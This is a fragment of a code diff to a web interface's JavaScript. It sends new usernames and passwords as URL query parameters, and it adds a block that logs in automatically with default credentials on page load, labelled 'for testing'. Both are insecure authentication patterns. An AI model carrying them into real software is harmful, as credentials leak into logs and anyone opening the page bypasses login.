+    await apiCall(`/api/change_credentials?new_username=${encodeURIComponent(newUser || curUser)}&new_password=${encodeURIComponent(newPass || curPass)}`, {
       method: 'POST'
     });
     alert('Credentials updated. Please login again.');
@@ -1992,8 +2046,14 @@ document.addEventListener('DOMContentLoaded', ()=>{
   document.querySelectorAll('.tab-pane').forEach(p => {
     if(!p.classList.contains('active')) p.style.display = 'none';
   });
+  
+  // Auto-login with default credentials (for testing)
+  setTimeout(() => {
+    if (document.getElementById('loginScreen').style.display !== 'none') {
+      login();
+    }
+  }, 500);
 });
 </script>
 </body>
 </html>
-
